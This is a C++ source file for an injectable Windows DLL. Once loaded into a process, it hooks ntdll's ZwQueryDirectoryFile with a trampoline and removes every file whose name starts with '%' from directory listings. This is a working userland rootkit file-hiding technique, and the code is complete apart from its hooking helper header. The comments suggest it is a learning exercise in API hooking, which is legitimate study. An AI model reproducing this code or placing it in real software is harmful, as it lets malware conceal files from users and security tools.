// dllmain.cpp : Defines the entry point for the DLL application.

#include <Windows.h>
#include <stdio.h>
#include <stdarg.h>
#include <ctype.h>
#include "hooking.h"

/* TYPE DEFINES */
typedef LONG NTSTATUS;
typedef void *PIO_APC_ROUTINE;
//typedef unsigned ULONG_PTR, *PULONG_PTR;
typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID Pointer;
    };
	
    ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

typedef enum _FILE_INFORMATION_CLASS {
    FileDirectoryInformation       = 1,
	FileFullDirectoryInformation,   // 2
	FileBothDirectoryInformation,   // 3
	FileBasicInformation,           // 4  wdm
	FileStandardInformation,        // 5  wdm
	FileInternalInformation,        // 6
	FileEaInformation,              // 7
	FileAccessInformation,          // 8
	FileNameInformation,            // 9
	FileRenameInformation,          // 10
	FileLinkInformation,            // 11
	FileNamesInformation,           // 12
	FileDispositionInformation,     // 13
	FilePositionInformation,        // 14 wdm
	FileFullEaInformation,          // 15
	FileModeInformation,            // 16
	FileAlignmentInformation,       // 17
	FileAllInformation,             // 18
	FileAllocationInformation,      // 19
	FileEndOfFileInformation,       // 20 wdm
	FileAlternateNameInformation,   // 21
	FileStreamInformation,          // 22
	FilePipeInformation,            // 23
	FilePipeLocalInformation,       // 24
	FilePipeRemoteInformation,      // 25
	FileMailslotQueryInformation,   // 26
	FileMailslotSetInformation,     // 27
	FileCompressionInformation,     // 28
	FileObjectIdInformation,        // 29
	FileCompletionInformation,      // 30
	FileMoveClusterInformation,     // 31
	FileQuotaInformation,           // 32
	FileReparsePointInformation,    // 33
	FileNetworkOpenInformation,     // 34
	FileAttributeTagInformation,    // 35
	FileTrackingInformation,        // 36
	FileIdBothDirectoryInformation, // 37
	FileIdFullDirectoryInformation, // 38
	FileMaximumInformation
} FILE_INFORMATION_CLASS, *PFILE_INFORMATION_CLASS;

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;


typedef struct _FILE_BOTH_DIR_INFORMATION {
	ULONG  NextEntryOffset;
	ULONG  FileIndex;
	LARGE_INTEGER  CreationTime;
	LARGE_INTEGER  LastAccessTime;
	LARGE_INTEGER  LastWriteTime;
	LARGE_INTEGER  ChangeTime;
	LARGE_INTEGER  EndOfFile;
	LARGE_INTEGER  AllocationSize;
	ULONG  FileAttributes;
	ULONG  FileNameLength;
	ULONG  EaSize;
	CCHAR  ShortNameLength;
	WCHAR  ShortName[12];
	WCHAR  FileName[1];
} FILE_BOTH_DIR_INFORMATION, *PFILE_BOTH_DIR_INFORMATION;

typedef 
NTSTATUS (WINAPI *fpZwQueryDirectoryFile)(
	HANDLE  FileHandle,
	HANDLE  Event,
	PIO_APC_ROUTINE  ApcRoutine,
	PVOID  ApcContext,
	PIO_STATUS_BLOCK  IoStatusBlock,
	PVOID  FileInformation,
	ULONG  Length,
	FILE_INFORMATION_CLASS  FileInformationClass,
	BOOLEAN  ReturnSingleEntry,
	PUNICODE_STRING  FileName,
	BOOLEAN  RestartScan
	);

/* FUNCTION PROTOTYPES */

/**
	@brief	This file will return true if a given filename matches the
			pattern we are looking for. In this case, a leading '%'.
			
	@param	[IN] wFilename - The file name to check.
	@param	[IN] cbLength - The length in bytes of the filename.

	@retval TRUE if the filename has a leading '%', FALSE otherwise.
*/
BOOL isFilenameHidden(PWCHAR wFilename, ULONG cbLength);

/**
	@brief	This is the wrapper for ZwQueryDirectoryFile. This function will
			call ZwQueryDirectoryFile with all the parameters passed in, but
			before it returns it will scrub the output buffer of all files
			that match the pattern we are trying to hide.

	@param	See the MSDN documentation for this function.

	@retval	NTSTATUS
*/
NTSTATUS WINAPI wrapperZwQueryDirectoryFile(
    HANDLE  FileHandle,
    HANDLE  Event,
    PIO_APC_ROUTINE  ApcRoutine,
    PVOID  ApcContext,
    PIO_STATUS_BLOCK  IoStatusBlock,
    PVOID  FileInformation,
    ULONG  Length,
    FILE_INFORMATION_CLASS  FileInformationClass,
    BOOLEAN  ReturnSingleEntry,
    PUNICODE_STRING  FileName,
    BOOLEAN  RestartScan
    );

/**
	@brief	Hides files patches ZwQueryDirectoryFile using our entry stub trampoline
			method.

	@param	NONE

	@retval	HOOKING_SUCCESS on success, or any HOOKING_* error on failure.
*/
DWORD WINAPI hideFiles();


void __cdecl odprintf(const char *format, ...);
/* This is the value passed into the DLL as the load reason */
#define MOBILE_CODE_ENTRY 4

/* NOTE: loader does not support initializing globals, so they will have to be */
/* initialized later. */
 
/* ZwQueryDirectoryInformation function pointer */
fpZwQueryDirectoryFile pZwQueryDirectoryFile = NULL;

/* ENTRYSTUB_TRAMP structure to be used with the MessageBox function */
PENTRY_STUB_TRAMP pZwQueryDirectoryFileStub = NULL;


/**
	@brief	This file will return true if a given filename matches the
			pattern we are looking for. In this case, a leading '%'.
			
	@param	[IN] wFilename - The file name to check.
	@param	[IN] cbLength - The length in bytes of the filename.

	@retval TRUE if the filename has a leading '%', FALSE otherwise.
*/
BOOL isFilenameHidden(PWCHAR wFilename, ULONG cbLength)
{
	return cbLength && wFilename[0] == '%';
}

/**
	@brief	This is the wrapper for ZwQueryDirectoryFile. This function will
			call ZwQueryDirectoryFile with all the parameters passed in, but
			before it returns it will scrub the output buffer of all files
			that match the pattern we are trying to hide.

	@param	See the MSDN documentation for this function.

	@retval	NTSTATUS
*/
NTSTATUS WINAPI wrapperZwQueryDirectoryFile(
    HANDLE  FileHandle,
    HANDLE  Event,
    PIO_APC_ROUTINE  ApcRoutine,
    PVOID  ApcContext,
    PIO_STATUS_BLOCK  IoStatusBlock,
    PVOID  FileInformation,
    ULONG  Length,
    FILE_INFORMATION_CLASS  FileInformationClass,
    BOOLEAN  ReturnSingleEntry,
    PUNICODE_STRING  FileName,
    BOOLEAN  RestartScan
    )
{	

	NTSTATUS status;
	PFILE_BOTH_DIR_INFORMATION pFileBothDirInfo = NULL;
	PFILE_BOTH_DIR_INFORMATION pNextFileBothDirInfo = NULL;
	ULONG cHidden = 0;
	ULONG cTotal = 0;
	PBYTE pBufMinusHidden = NULL;
	PBYTE pBufIndex = NULL;
	PFILE_BOTH_DIR_INFORMATION pLastNonHidden = NULL;
	ULONG cbRemaining = 0;

	/* Call the original */
	status = ((fpZwQueryDirectoryFile)pZwQueryDirectoryFileStub->pTrampoline)(
		FileHandle, 
		Event, 
		ApcRoutine, 
		ApcContext,
		IoStatusBlock, 
		FileInformation, 
		Length,
		FileInformationClass, 
		ReturnSingleEntry, 
		FileName,
		RestartScan);

	if(FileBothDirectoryInformation == FileInformationClass && 
	   0 == status && /* Success */
	   0 != Length    /* There's something in the buffer. */
	   )
	{	
		/* Cases to consider:                          */
		/* A) there is only one file, it is hidden.    */
		/* B) there are two files, both are hidden.    */
		/* C) there are two files, second is hidden.   */
		/* D) there are two files, first is hidden.    */
		/* E) there are three files, middle is hidden. */
		
		/* This is what the file dialog in notepad [indirectly] uses. There */
		/* are several other info classes that you'd want to handle if you  */
		/* seriously wanted to hide files from this process.                */
		pFileBothDirInfo = (PFILE_BOTH_DIR_INFORMATION)FileInformation;
		
		/* Check for the cases: no hidden files and all hidden files first: */
		do
		{
			pNextFileBothDirInfo = NULL;
			if(pFileBothDirInfo->NextEntryOffset)
			{
				pNextFileBothDirInfo = (PFILE_BOTH_DIR_INFORMATION)((PBYTE)pFileBothDirInfo + pFileBothDirInfo->NextEntryOffset);
			}

			if(isFilenameHidden(pFileBothDirInfo->FileName, pFileBothDirInfo->FileNameLength))
			{
				cHidden++;
			}
			cTotal++;
			pFileBothDirInfo = pNextFileBothDirInfo;
		} while(pFileBothDirInfo);

		/* Most cases should be no hidden files. Go ahead and return now if that's the case. */
		if(0 == cHidden)
		{
			return status;
		}
		
		/* If all are hidden, there probably should not have been a success.            */
		/* NOTE: can this happen if these are always directories? Or can they be files? */
		if(cHidden == cTotal)
		{
			return IoStatusBlock->Status = -1; /* HAT IS THE PROPER STATUS?! */
		}

		/* Some are hidden, let's do the simplest (but not most efficient) thing: */
		/* Copy clean ones over, then copy the clean array over the output array  */
		pBufMinusHidden = (PBYTE) VirtualAlloc(NULL, Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

		pBufIndex = pBufMinusHidden;
		cbRemaining = Length;

		pFileBothDirInfo = (PFILE_BOTH_DIR_INFORMATION)FileInformation;
		do
		{
			pNextFileBothDirInfo = NULL;
			if(pFileBothDirInfo->NextEntryOffset)
			{
				pNextFileBothDirInfo = (PFILE_BOTH_DIR_INFORMATION)((PBYTE)pFileBothDirInfo + pFileBothDirInfo->NextEntryOffset);
			}
			
			/* If the file does not match our pattern, copy it over, esle skip it. */
			if(!isFilenameHidden(pFileBothDirInfo->FileName, pFileBothDirInfo->FileNameLength))
			{
				pLastNonHidden = (PFILE_BOTH_DIR_INFORMATION)pBufIndex;
				memcpy(pBufIndex, pFileBothDirInfo, (pNextFileBothDirInfo) ? pFileBothDirInfo->NextEntryOffset : cbRemaining);
				pBufIndex += pFileBothDirInfo->NextEntryOffset;
			}

			cbRemaining -= pFileBothDirInfo->NextEntryOffset;
			pFileBothDirInfo = pNextFileBothDirInfo;
		} while(pFileBothDirInfo);

		/* Ensure last entry has 0 for next offset. */
		if(pLastNonHidden)
			pLastNonHidden->NextEntryOffset = 0;
		
		/* Copy clean buffer over existing buffer. */
		memcpy(FileInformation, pBufMinusHidden, Length);
		VirtualFree(pBufMinusHidden, 0, MEM_RELEASE);
	}

	return status;
}

/**
	@brief	Hides files patches ZwQueryDirectoryFile using our entry stub trampoline
			method.

	@param	NONE

	@retval	HOOKING_SUCCESS on success, or any HOOKING_* error on failure.
*/
DWORD WINAPI hideFiles()
{
	DWORD dwRet = HOOKING_SUCCESS;
	BOOL bFunctionHooked = FALSE;
	BOOL bSafeToCleanup = FALSE;

	pZwQueryDirectoryFile  = (fpZwQueryDirectoryFile) 
		GetProcAddress(GetModuleHandle(L"ntdll"), "ZwQueryDirectoryFile");

	/* Set up the ENTRY_STUB_TRAMP structure by calling the create function */
	dwRet = EntryStub_create(&pZwQueryDirectoryFileStub, pZwQueryDirectoryFile, SIZEOF_JMPPATCH);
	if(HOOKING_SUCCESS == dwRet)
	{
		/* Hook the function */
		bFunctionHooked = EntryStub_hook(pZwQueryDirectoryFileStub, wrapperZwQueryDirectoryFile);
		if(FALSE == bFunctionHooked)
		{
			dwRet = HOOKING_FAILURE;
		}
	}
	return dwRet;
}

DWORD WINAPI start(LPVOID lpParameter){
	odprintf("Calling out from inside %d.", GetCurrentProcessId());

	// TODO: Lay some hooks and season liberaly with pwnsauce...
	//Sleep(5000);

	odprintf("HideFiles: %d", hideFiles());

	odprintf("%d:%d exiting...", GetCurrentProcessId(), GetCurrentThreadId());

	FreeLibraryAndExitThread(GetModuleHandle(NULL),0);

	return 0;
}

void createNewThread(){
	HANDLE t;
	DWORD tid;
	t = CreateThread(NULL, 0, start, NULL, 0, &tid);
	odprintf("Created thread %d inside of process %d.", tid, GetCurrentProcessId());
	CloseHandle(t);
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		odprintf("Loading injexdll.dll!");
		createNewThread();
		break;

	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;

	case DLL_PROCESS_DETACH:
		odprintf("Unloading injexdll.dll!");
		break;
	}

	return TRUE;
}

void __cdecl odprintf(const char *format, ...)
{
	char    buf[4096], *p = buf;
	va_list args;
	int     n;

	va_start(args, format);
	n = _vsnprintf_s(p, 4096, sizeof buf - 3, format, args); // buf-3 is room for CR/LF/NUL
	va_end(args);

	p += (n < 0) ? sizeof buf - 3 : n;

	while ( p > buf  &&  isspace(p[-1]) )
			*--p = '\0';

	*p++ = '\r';
	*p++ = '\n';
	*p   = '\0';

	OutputDebugStringA(buf);
}